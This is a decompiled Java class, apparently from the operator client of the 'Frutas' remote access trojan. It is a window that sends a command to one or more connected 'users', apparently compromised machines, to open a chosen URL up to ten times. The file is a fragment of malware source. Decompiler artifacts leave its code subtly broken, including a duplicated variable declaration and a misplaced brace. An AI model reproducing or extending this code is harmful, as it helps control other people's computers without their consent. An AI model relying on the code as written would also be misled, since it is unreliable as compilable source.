/*     */ package cliente;
/*     */ 
/*     */ import java.awt.Color;
/*     */ import java.awt.Container;
/*     */ import java.awt.Cursor;
/*     */ import java.awt.Font;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ActionListener;
/*     */ import java.util.ResourceBundle;
/*     */ import javax.swing.GroupLayout;
/*     */ import javax.swing.GroupLayout.Alignment;
/*     */ import javax.swing.GroupLayout.ParallelGroup;
/*     */ import javax.swing.GroupLayout.SequentialGroup;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JInternalFrame;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JOptionPane;
/*     */ import javax.swing.JSpinner;
/*     */ import javax.swing.JTextField;
/*     */ import javax.swing.LayoutStyle.ComponentPlacement;
/*     */ import javax.swing.SpinnerNumberModel;
/*     */ 
/*     */ public class AbrirPaginaRemota extends JInternalFrame
/*     */   implements SoporteLenguaje
/*     */ {
/*     */   private Usuario[] user;
/*     */   private ResourceBundle rb;
/*     */   private String textoTitulo;
/*     */   private JButton jButton1;
/*     */   private JSpinner num;
/*     */   private JLabel numeroVeces;
/*     */   private JTextField url;
/*     */ 
/*     */   public AbrirPaginaRemota(Usuario[] us, ResourceBundle rbx)
/*     */   {
/*  23 */     initComponents();
/*  24 */     this.num.setBackground(Color.CYAN);
/*  25 */     this.num.setForeground(Color.CYAN);
/*  26 */     this.user = us;
/*     */ 
/*  28 */     if (this.user.length > 1) {
/*  29 */       setTitle(getTitle() + " a" + us.length + " users");
/*  30 */       this.textoTitulo = (" a" + us.length + " users");
/*     */     } else {
/*  32 */       setTitle(getTitle() + this.user[0].getIdentificador());
/*  33 */     }this.textoTitulo = this.user[0].getIdentificador();
/*     */ 
/*  35 */     changeLenguage(rbx);
/*     */   }
/*     */ 
/*     */   private void initComponents()
/*     */   {
/*  47 */     this.url = new JTextField();
/*  48 */     this.jButton1 = new JButton();
/*  49 */     this.num = new JSpinner();
/*  50 */     this.numeroVeces = new JLabel();
/*     */ 
/*  52 */     setBackground(new Color(255, 255, 153));
/*  53 */     setClosable(true);
/*  54 */     setForeground(new Color(255, 255, 153));
/*  55 */     setIconifiable(true);
/*  56 */     setTitle("URL Remota: ");
/*  57 */     setOpaque(true);
/*     */ 
/*  59 */     this.url.setBackground(new Color(255, 255, 153));
/*  60 */     this.url.setFont(new Font("Times New Roman", 1, 14));
/*  61 */     this.url.setForeground(new Color(0, 0, 153));
/*  62 */     this.url.setHorizontalAlignment(0);
/*  63 */     this.url.setText("http://www.google.com");
/*     */ 
/*  65 */     this.jButton1.setBackground(new Color(255, 255, 255));
/*  66 */     this.jButton1.setFont(new Font("Arial", 1, 12));
/*  67 */     this.jButton1.setText("Enviar");
/*  68 */     this.jButton1.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/*  70 */         AbrirPaginaRemota.this.jButton1ActionPerformed(evt);
/*     */       }
/*     */     });
/*  74 */     this.num.setFont(new Font("Times New Roman", 1, 14));
/*  75 */     this.num.setModel(new SpinnerNumberModel(1, 1, 10, 1));
/*  76 */     this.num.setCursor(new Cursor(0));
/*     */ 
/*  78 */     this.numeroVeces.setFont(new Font("Times New Roman", 1, 14));
/*  79 */     this.numeroVeces.setForeground(new Color(0, 0, 204));
/*  80 */     this.numeroVeces.setText("Numero de veces: ");
/*     */ 
/*  82 */     GroupLayout layout = new GroupLayout(getContentPane());
/*  83 */     getContentPane().setLayout(layout);
/*  84 */     layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.url, -2, 0, 32767).addGroup(layout.createSequentialGroup().addComponent(this.numeroVeces).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.num, -2, 57, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, 34, 32767).addComponent(this.jButton1, -2, 97, -2))).addContainerGap()));
/*     */ 
/*  98 */     layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap(16, 32767).addComponent(this.url, -2, -1, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.numeroVeces).addComponent(this.num, -2, -1, -2).addComponent(this.jButton1))));
/*     */ 
/* 110 */     pack();
/*     */   }
/*     */ 
/*     */   private void jButton1ActionPerformed(ActionEvent evt)
/*     */   {
/* 115 */     if (this.url.getText().isEmpty()) {
/* 116 */       JOptionPane.showMessageDialog(this.rootPane, "No seas tarado abrir", "Loco", 0);
/*     */       return;
/*     */     }
/*     */     String ur;
/*     */     String ur;
/* 121 */     if (this.url.getText().contains("http"))
/* 122 */       ur = this.url.getText();
/*     */     else {
/* 124 */       ur = "http://" + this.url.getText();
/*     */     }
/*     */ 
/* 128 */     String urlFinal = this.num.getValue().toString() + "#" + ur;
/*     */ 
/* 131 */     for (int i = 0; i < this.user.length; i++)
/* 132 */       this.user[i].sendComando(5, urlFinal);
/*     */   }
/*     */ 
/*     */   public void changeLenguage(ResourceBundle rbb)
/*     */   {
/* 139 */     this.rb = rbb;
/* 140 */     setTitle(this.rb.getString("abrir.url.titulo") + this.textoTitulo);
/* 141 */     this.numeroVeces.setText(this.rb.getString("abrir.url.labelVeces"));
/* 142 */     this.jButton1.setText(this.rb.getString("abrir.url.botonEnviar"));
/*     */   }
/*     */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.AbrirPaginaRemota
 * JD-Core Version:    0.6.2
 */